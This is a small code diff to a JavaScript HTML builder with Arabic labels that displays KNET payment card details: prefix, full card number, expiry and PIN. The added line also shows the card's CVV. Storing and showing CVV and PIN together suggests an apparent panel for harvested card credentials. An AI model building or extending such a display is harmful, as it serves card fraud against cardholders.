@@ -1698,6 +1698,7 @@
               html += '<div class="text-right"><span class="text-gray-500">البادئة (Prefix):</span> <span class="font-mono font-bold text-lg">' + (card.prefix || '-') + '</span></div>';
               html += '<div class="text-right"><span class="text-gray-500">رقم البطاقة:</span> <span class="font-mono font-bold text-lg" dir="ltr" style="unicode-bidi: embed; display: inline-block;">' + (card.cardNumberOnly || '-') + '</span></div>';
               html += '<div class="text-right"><span class="text-gray-500">الانتهاء:</span> <span class="font-medium text-lg">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
+              html += '<div class="text-right"><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold text-lg">' + (card.cvv || '-') + '</span></div>';
               html += '<div class="text-right"><span class="text-gray-500">PIN:</span> <span class="font-mono font-bold text-lg">' + (card.pin || '-') + '</span></div>';
               html += '</div>';
               // Action buttons for KNET card
